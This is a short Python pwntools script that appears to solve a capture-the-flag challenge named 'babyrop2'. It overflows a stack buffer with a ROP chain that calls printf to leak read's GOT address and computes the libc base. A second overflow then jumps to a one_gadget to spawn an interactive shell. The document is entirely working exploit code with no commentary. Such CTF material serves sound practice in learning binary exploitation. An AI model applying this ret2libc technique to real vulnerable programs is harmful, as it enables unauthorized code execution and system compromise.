from pwn import *

elf = ELF('babyrop2')

libc = ELF('./libc.so.6')

pop_rdi = 0x0000000000400733

printf= 0x4004F0

read = elf.got['read']

pop_rsi_r15 = 0x0000000000400731

leak_str=0x400770

start= 0x400689

sc = 'a' * 0x28 + p64(pop_rsi_r15) + 2*p64(read) + p64(pop_rdi) + p64(leak_str) + p64(printf) + p64(start)

r=process('./babyrop2')
gdb.attach(r)
r.sendlineafter('name? ', sc)

r.recvline()

r.recvuntil(', ')
read_adr = r.recvline()[:-2]

read_adr = u64(read_adr + (8-len(read_adr))*'\x00')

libc_offset = read_adr - libc.symbols['read']

one_gadget = 0x45216 + libc_offset

sc = 'a' * 0x28 + p64(one_gadget)

r.sendlineafter('name? ', sc)

r.interactive()
